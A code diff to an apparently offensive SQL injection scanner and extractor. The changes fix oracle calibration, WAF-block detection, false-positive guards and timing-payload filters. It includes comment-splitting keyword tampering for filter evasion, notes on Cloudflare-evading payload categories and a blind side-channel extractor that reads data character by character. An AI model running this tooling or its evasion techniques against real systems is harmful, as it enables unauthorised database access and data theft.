@@ -29843,7 +29843,7 @@ class TamperLib:
     def keywordsplit(p: str) -> str:
         """Split SQL keywords with inline comments: SELECT  S/**/ELECT, SLEEP  SL/**/EEP."""
         _kws = {"SELECT":"S/**/ELECT","UNION":"UN/**/ION","FROM":"FR/**/OM",
-                "WHERE":"WH/**/ERE","SLEEP":"SL/**/EEP","WAITFOR":"WAIT/**/FOR",
+                "WHERE":"WH/**/ERE",
                 "INSERT":"INS/**/ERT","UPDATE":"UPD/**/ATE","DELETE":"DEL/**/ETE",
                 "BETWEEN":"BET/**/WEEN","HAVING":"HAV/**/ING","EXISTS":"EXI/**/STS",
                 "CONCAT":"CON/**/CAT","SUBSTR":"SUB/**/STR","LIMIT":"LI/**/MIT"}
@@ -36918,6 +36918,16 @@ def get_dbms_payloads(dbms: str, technique: str, level: int = 1) -> list:
                     # path, but globals() returns POSTGRESQL_NOVEL_PAYLOADS unmodified. COPY TO
                     # writes server-side files — out of scope for SQL injection detection.
                     and not (_filter_is_pg and _is_pg_copy_to(_gp))
+                    # BUG-PG-SLEEP-VOID FIX: pg_sleep() returns void; placing it directly in a
+                    # WHERE clause (e.g. WHERE pg_sleep(5)=...) causes a type error rather than
+                    # a timing delay.  Only allow pg_sleep payloads that wrap it in a boolean-
+                    # compatible form (IS NOT NULL, cast, SELECT 1 FROM pg_sleep, etc.).
+                    and not (_filter_is_pg
+                             and _re.search(r'\bpg_sleep\b', _gp, _re.IGNORECASE)
+                             and not _re.search(
+                                 r'IS\s+NOT\s+NULL|=\s*1\b|SELECT\s+1\s+FROM\s+pg_sleep|'
+                                 r'cast\s*\(\s*pg_sleep|SELECT\s+CAST\s*\(\s*pg_sleep',
+                                 _gp, _re.IGNORECASE))
                 )
             ]
             # BUG-R13 FIX (Req 1): Deduplicate the filtered payload list using
@@ -59124,7 +59134,7 @@ class Scanner:
             self.session.data.get("banner") or
             self.session.data.get("current_db")
         )
-        if not _r7_have_data and (_dbms_confirmed or _margin >= _min_viable_margin or _boolean_oracle):
+        if not _r7_have_data and not _oracle_fragile and (_dbms_confirmed or _margin >= _min_viable_margin or _boolean_oracle):
             LOG.info(
                 "[Inference] BUG7-RETRY: re-running extraction now that all functions are defined "
                 "(boolean_oracle=%s hdr=%s margin=%.0fms bitwise_fallback=%s)",
@@ -98045,7 +98055,7 @@ class WAFBlockDiscriminator:
       - Rate limit responses
     """
 
-    WAF_BLOCK_CODES = {403, 406, 412, 429, 503}
+    WAF_BLOCK_CODES = {400, 403, 406, 412, 429, 503}
 
     WAF_BLOCK_PATTERNS = [
         r"cloudflare.*ray",
@@ -106822,7 +106832,7 @@ class TechniqueCascadeEngine:
                 if _validate_response(_cfp, "response_body_check"):
                     _cbody = _safe_decode_body(_cfp, encoding="utf-8", errors="replace", func_name="extraction").lower()
                     
-                    if _c_status == 500 and _bl_status != 500:
+                    if _c_status in (400, 500) and _bl_status not in (400, 500):
                         _any_status_500 = True
                         _status_500_count += 1
                     
@@ -106874,16 +106884,18 @@ class TechniqueCascadeEngine:
             # Fallback: if 2+ distinct error payloads each produced HTTP 500 (absent from
             # baseline), accept as a weak-but-valid error signal. Require ≥2 payloads to
             # rule out a single transient server error, and require baseline was NOT 500.
-            if _status_500_count >= 2 and _bl_status not in (500, 503):
+            if _status_500_count >= 2 and _bl_status not in (400, 500, 503):
                 # BUG-HTTP500-SELECTIVITY FIX: HTTP 500 must be SELECTIVE to SQL
                 # payloads, not triggered by any modification (like VIEWSTATE MAC).
-                # Send a clearly non-SQL garbage probe and reject if it also → 500.
+                # BUG-PCV-C-400-FIX: Also treat 400 as error signal (WAF returns 400
+                # on injected SQL). _status_500_count now covers both 400 and 500.
+                # Send a clearly non-SQL garbage probe and reject if it also → 400/500.
                 _canary_p = original + " CANARY_SQLREAPER_RANDOM_9x7z"
                 try:
                     _can_fp, _, _can_status, _ = await _pcv_send(_canary_p)
-                    if _can_status == 500:
-                        print(f"[*]     Check C HTTP-500 REJECTED: canary (non-SQL)"
-                              " also caused 500 → parameter validation failure (e.g."
+                    if _can_status in (400, 500):
+                        print(f"[*]     Check C HTTP-{_can_status} REJECTED: canary (non-SQL)"
+                              f" also caused {_can_status} → parameter validation failure (e.g."
                               " __VIEWSTATE MAC), NOT SQL injection", flush=True)
                         return False, "", "", ""
                 except Exception:
@@ -110121,7 +110133,7 @@ class TechniqueCascadeEngine:
                 # exotic payloads that evade Cloudflare can still detect injection.
                 # ST (Standard/WAFBypass), NV (Novel), WB (WAFBypass), EX (Exotic),
                 # HY (Hybrid) use boolean oracle but with Cloudflare-evading SQL.
-                _timing_capable = {"T", "S", "HQ", "TH", "BT", "E", "EH",
+                _timing_capable = {"T", "S", "HQ", "TH", "BT",
                                    "ST", "NV", "WB", "EX", "HY"}
                 LOG.info("  [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set "
                          "includes WAF-bypass categories ST/NV/WB/EX/HY")
@@ -133193,6 +133205,22 @@ class SideChannelExtractor:
 
         print(f"[SideChannel] Extracting: {expr[:50]} via {self._error_strategy} (signal={self._signal_type})", flush=True)
 
+        # BUG-SCE-WE-SANITY FIX: Verify oracle polarity before starting binary search.
+        # Without this check, a stale or inverted oracle (e.g. probe_where_error() reused
+        # a strategy that returns True for everything) causes the binary search to converge
+        # on chr(1114111) garbage for every position.  Test 1=1 (must be True) vs 1=2
+        # (must be False); if either fails, abort extraction for this expression.
+        try:
+            _san_true  = await self.eval_where_error("1=1")
+            _san_false = await self.eval_where_error("1=2")
+            if _san_true is not True or _san_false is not False:
+                print(f"[SideChannel] Oracle sanity FAILED (1=1→{_san_true}, 1=2→{_san_false})"
+                      f" — aborting extraction for: {expr[:50]}", flush=True)
+                return ""
+        except Exception as _san_ex:
+            print(f"[SideChannel] Oracle sanity check raised {_san_ex!r} — aborting extraction", flush=True)
+            return ""
+
         prefix = ""
         _consecutive_fail = 0
         # (BUG-V39-BATCH FIX: removed inline `import time as _t_we` — use module-level `time`)
@@ -147093,7 +147121,7 @@ class FalsePositiveValidator:
             # BUG-PCV-FPV-STRICT FIX: small-but-highly-consistent difference
             (status_consistent and length_diff >= 20 and var_t < 30 and var_f < 30) or
             # BUG-PCV-FPV-STRICT FIX: zero-variance (all trials identical) with any length change
-            (var_t == 0.0 and var_f == 0.0 and length_diff > 0) or
+            (var_t == 0.0 and var_f == 0.0 and length_diff > 0 and len(true_lengths) >= 2) or
             # BUG-FPV-COMPACT-API FIX (Req 3): JSON/compact-API targets return responses
             # of only 50-500 bytes; even a 1-field change is only 5-15 bytes different.
             # length_diff >= 5 bytes with BOTH variance groups < 10 bytes means the
@@ -158449,7 +158477,7 @@ class FalsePositiveGuardV18:
                 else:
                     # PCV-L1 FIX: raised threshold from 0.80 → 0.85.
                     # BUG-16-FIX: compare to _l1_ref_body (first live probe) not norm_true (stale).
-                    if SimHasher.body_similarity(_l1_ref_body, norm_r) > 0.82:  # BUG-FIX-3D: tightened 0.85→0.87
+                    if SimHasher.body_similarity(_l1_ref_body, norm_r) > 0.87:  # BUG-FIX-3D: tightened 0.85→0.87
                         pos_count += 1
             except Exception:
                 pass
@@ -160479,7 +160507,7 @@ async def _run_fp_guards_boolean(
             'DBMS_PIPE.RECEIVE_MESSAGE', 'DBMS_LOCK.SLEEP',
             'DBMS_SESSION.SLEEP', 'DBMS_UTILITY.GET_TIME',  # BUG-TIMING-KW-MISSING FIX: DBMS_UTILITY added (Oracle)
             'GENERATE_SERIES(',
-            'ALL_OBJECTS', 'PG_CLASS',
+            'FROM ALL_OBJECTS', ',ALL_OBJECTS', 'FROM PG_CLASS', ',PG_CLASS',
         )
         # BUG-12B: check both original and comment-stripped form
         _has_timing_kw_fpg = (any(k in _tp_upper_fpg for k in _timing_kws_fpg)
@@ -163111,6 +163139,10 @@ class ConditionalErrorOracle:
                                   f"oracle (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                   flush=True)
                             continue
+                        _ceo_cal_waf = {400, 403, 406, 429, 430, 503}
+                        if (_t_st in _ceo_cal_waf and _t_st < 500
+                                and _t_st != self._baseline_status):
+                            continue  # WAF-block on true probe — can't calibrate from this template
                         _true_err = (_t_st >= 500 or _t_st != self._baseline_status)
                         _false_ok = (_f_st < 500 and _f_st == self._baseline_status)
                         if _true_err and _false_ok:
